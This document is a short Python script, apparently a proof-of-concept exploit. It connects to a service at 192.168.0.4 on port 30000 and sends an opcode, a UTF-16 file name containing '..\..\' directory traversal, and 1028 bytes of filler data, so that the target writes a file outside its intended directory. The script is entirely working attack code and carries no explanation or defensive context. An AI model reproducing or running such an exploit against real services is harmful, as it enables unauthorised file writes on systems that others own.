import socket
import struct
import ctypes
 
FileName="\x2E\x00\x2E\x00\x5C\x00\x2E\x00\x2E\x00\x5C\x00\x74\x00\x65\x00\x73\x00\x74\x00" #..\..\test
Data="A"*1028
FileSize=len(Data)
FNsz=len(FileName)
OpCode="\xD0\x07\x00\x00"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.4", 30000))
s.send(OpCode)
s.send(struct.pack("I", FNsz))
s.send(FileName)
s.send(struct.pack('<Q', FileSize))
s.send(Data)
